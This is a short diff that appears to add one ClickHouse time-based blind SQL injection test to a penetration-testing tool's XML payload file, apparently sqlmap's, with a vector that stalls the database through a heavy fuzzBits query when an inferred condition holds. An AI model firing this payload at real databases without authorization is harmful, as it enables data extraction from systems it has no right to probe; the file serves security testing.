@@ -1494,6 +1494,26 @@
         </details>
     </test>
 
+
+    <test>
+        <title>Clickhouse AND time-based blind (heavy query) - fuzzBits</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>OR [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(if(([INFERENCE]), 1000000, 1)))</vector>
+        <request>
+            <payload>OR [RANDNUM]=(SELECT COUNT(fuzzBits('[RANDSTR]', 0.001)) FROM numbers(1000000))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>Clickhouse</dbms>
+        </details>
+    </test>
+
     <!-- End of time-based boolean tests -->
 
     <!-- Time-based boolean tests - Numerous clauses -->
